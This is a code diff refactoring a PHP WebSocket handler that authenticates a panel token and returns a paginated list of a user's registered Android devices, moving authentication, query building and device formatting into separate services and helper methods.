@@ -5,115 +5,60 @@ declare(strict_types=1);
 namespace App\WebSocket\Handlers;
 
 use App\Models\Device;
-use App\Services\PanelTokenService;
 use App\WebSocket\ConnectionManager;
+use App\WebSocket\Messages\WebSocketMessage;
+use App\WebSocket\Services\PanelAuthService;
 use App\WebSocket\WebSocketLog;
 
 final class CheckPhoneHandler
 {
     private ConnectionManager $connectionManager;
 
-    public function __construct(ConnectionManager $connectionManager)
+    private PanelAuthService $panelAuthService;
+
+    public function __construct(ConnectionManager $connectionManager, PanelAuthService $panelAuthService)
     {
         $this->connectionManager = $connectionManager;
+        $this->panelAuthService = $panelAuthService;
     }
 
-    public function handle(int $fd, array $data): void
+    public function handle(int $fd, WebSocketMessage $message): void
     {
-        $token = $data['token'] ?? '';
-        $page = max(1, (int) ($data['page'] ?? 1));
-        $pageSize = min(100, max(1, (int) ($data['pageSize'] ?? 10)));
-        $filters = $data['filters'] ?? [];
+        $token = $message->token();
+        $page = $message->page();
+        $pageSize = $message->pageSize();
+        $filters = $message->filters();
 
         if (empty($token)) {
             WebSocketLog::getLogger()->warning("CheckPhone: missing token, fd={$fd}");
-            $this->connectionManager->send($fd, [
-                'type' => 'checkphone',
-                'error' => 'Token is required',
-                'list' => [],
-                'total' => 0,
-                'pageCount' => 0,
-                'page' => $page,
-                'pageSize' => $pageSize,
-            ]);
+            $this->connectionManager->send($fd, $this->buildErrorResponse('Token is required', $page, $pageSize));
 
             return;
         }
 
-        $tokenService = new PanelTokenService;
-        $result = $tokenService->validateToken($token);
+        $authResult = $this->panelAuthService->authenticate($token);
 
-        if (! $result['authenticated']) {
+        if ($authResult === null) {
             WebSocketLog::getLogger()->warning("CheckPhone: invalid token, fd={$fd}");
-            $this->connectionManager->send($fd, [
-                'type' => 'checkphone',
-                'error' => 'Invalid or expired token',
-                'list' => [],
-                'total' => 0,
-                'pageCount' => 0,
-                'page' => $page,
-                'pageSize' => $pageSize,
-            ]);
+            $this->connectionManager->send($fd, $this->buildErrorResponse('Invalid or expired token', $page, $pageSize));
 
             return;
         }
 
-        $userId = $result['user_id'];
-        $guard = $result['guard'];
-        $isAdmin = $guard === 'admin';
+        $isAdmin = $authResult->isAdmin;
+        $ownerId = $authResult->ownerId;
 
-        \Illuminate\Support\Facades\DB::reconnect();
-
-        if ($isAdmin) {
-            $user = \App\Models\Admin::find($userId);
-        } else {
-            $user = \App\Models\User::find($userId);
-        }
-
-        if ($user === null) {
-            WebSocketLog::getLogger()->warning("CheckPhone: user not found, fd={$fd}, userId={$userId}");
-            $this->connectionManager->send($fd, [
-                'type' => 'checkphone',
-                'error' => 'User not found',
-                'list' => [],
-                'total' => 0,
-                'pageCount' => 0,
-                'page' => $page,
-                'pageSize' => $pageSize,
-            ]);
-
-            return;
-        }
-
-        // Resolve resource owner for sub-accounts
-        $ownerEmail = $user->email;
-        $ownerId = $isAdmin ? null : $userId;
-
-        if (! $isAdmin) {
-            $owner = $user->getResourceOwner();
-            $ownerEmail = $owner->email;
-            $ownerId = $owner->id;
-        }
-
-        WebSocketLog::getLogger()->debug("CheckPhone: fd={$fd}, userId={$userId}, isAdmin=".($isAdmin ? 'true' : 'false'));
+        WebSocketLog::getLogger()->debug("CheckPhone: fd={$fd}, userId={$authResult->userId}, isAdmin=".($isAdmin ? 'true' : 'false'));
 
         // Register panel user with userId for device authorization
-        $this->connectionManager->registerPanelUser($fd, $ownerEmail, $isAdmin, $ownerId);
+        $this->connectionManager->registerPanelUser($fd, $authResult->ownerEmail, $isAdmin, $ownerId);
 
-        $query = Device::query()->where('is_removed', false);
-
-        if (! $isAdmin) {
-            if ($ownerId !== null) {
-                $query->where('user_id', $ownerId);
-            } else {
-                $query->whereRaw('1 = 0');
-            }
-        }
+        $query = $this->buildDeviceQuery($isAdmin, $ownerId);
 
         $this->applyFilters($query, $filters);
 
         $total = $query->count();
-        WebSocketLog::getLogger()->debug("CheckPhone: found {$total} devices for userId={$userId}");
+        WebSocketLog::getLogger()->debug("CheckPhone: found {$total} devices for userId={$authResult->userId}");
         $pageCount = (int) ceil($total / $pageSize);
 
         $devices = $query
@@ -125,30 +70,7 @@ final class CheckPhoneHandler
         // 获取内存中所有在线设备的状态，用于实时判断在线状态
         $onlineDevices = $this->connectionManager->getAllOnlineDevices();
 
-        $list = $devices->map(function (Device $device) use ($onlineDevices) {
-            $uuid = $device->uuid;
-            $status = $this->connectionManager->getDeviceStatus($uuid);
-
-            // 优先使用内存中的在线状态（更准确）
-            $isOnline = isset($onlineDevices[$uuid]);
-
-            // 如果内存中有更新的设备信息，使用内存中的数据
-            $memoryStatus = $onlineDevices[$uuid] ?? [];
-
-            return [
-                'phone_id' => $uuid,
-                'phone_name' => $memoryStatus['name'] ?? $device->name ?? '',
-                'model' => $memoryStatus['model'] ?? $device->model ?? '',
-                'android_version' => $memoryStatus['android_version'] ?? $device->android_version ?? '',
-                'battery_charge' => $memoryStatus['battery_level'] ?? $device->battery_level ?? '',
-                'accessibility' => ($memoryStatus['has_accessibility'] ?? ($device->has_accessibility ? '1' : '0')) === '1' ? '1' : ($device->has_accessibility ? '1' : '0'),
-                'country' => $memoryStatus['country'] ?? $device->country ?? '',
-                'user_email' => $status['user_email'] ?? '',
-                'install_date' => $device->installed_at?->format('Y-m-d H:i:s') ?? '',
-                'is_online' => $isOnline,
-                'lastPing' => ($status['last_ping'] ?? 0) * 1000,
-            ];
-        })->toArray();
+        $list = $devices->map(fn (Device $device) => $this->formatDeviceForCheckPhone($device, $onlineDevices))->toArray();
 
         $this->connectionManager->send($fd, [
             'type' => 'checkphone',
@@ -159,6 +81,69 @@ final class CheckPhoneHandler
             'pageSize' => $pageSize,
             'fileLastModified' => $this->getApkTemplateLastModified(),
         ]);
+    }
+
+    private function buildErrorResponse(string $error, int $page, int $pageSize): array
+    {
+        return [
+            'type' => 'checkphone',
+            'error' => $error,
+            'list' => [],
+            'total' => 0,
+            'pageCount' => 0,
+            'page' => $page,
+            'pageSize' => $pageSize,
+        ];
+    }
+
+    private function buildDeviceQuery(bool $isAdmin, ?int $ownerId): \Illuminate\Database\Eloquent\Builder
+    {
+        $query = Device::query()->where('is_removed', false);
+
+        if (! $isAdmin) {
+            if ($ownerId !== null) {
+                $query->where('user_id', $ownerId);
+            } else {
+                $query->whereRaw('1 = 0');
+            }
+        }
+
+        return $query;
+    }
+
+    private function formatDeviceForCheckPhone(Device $device, array $onlineDevices): array
+    {
+        $uuid = $device->uuid;
+        $status = $this->connectionManager->getDeviceStatus($uuid);
+
+        $isOnline = isset($onlineDevices[$uuid]);
+        $memoryStatus = $onlineDevices[$uuid] ?? [];
+
+        return [
+            'phone_id' => $uuid,
+            'phone_name' => $memoryStatus['name'] ?? $device->name ?? '',
+            'model' => $memoryStatus['model'] ?? $device->model ?? '',
+            'android_version' => $memoryStatus['android_version'] ?? $device->android_version ?? '',
+            'battery_charge' => $memoryStatus['battery_level'] ?? $device->battery_level ?? '',
+            'accessibility' => $this->resolveAccessibilityStatus($memoryStatus, $device),
+            'country' => $memoryStatus['country'] ?? $device->country ?? '',
+            'user_email' => $status['user_email'] ?? '',
+            'install_date' => $device->installed_at?->format('Y-m-d H:i:s') ?? '',
+            'is_online' => $isOnline,
+            'lastPing' => ($status['last_ping'] ?? 0) * 1000,
+        ];
+    }
+
+    private function resolveAccessibilityStatus(array $memoryStatus, Device $device): string
+    {
+        $memoryValue = $memoryStatus['has_accessibility'] ?? null;
+        $dbValue = $device->has_accessibility ? '1' : '0';
+
+        if ($memoryValue !== null) {
+            return $memoryValue === '1' ? '1' : $dbValue;
+        }
+
+        return $dbValue;
     }
 
     private function applyFilters($query, array $filters): void
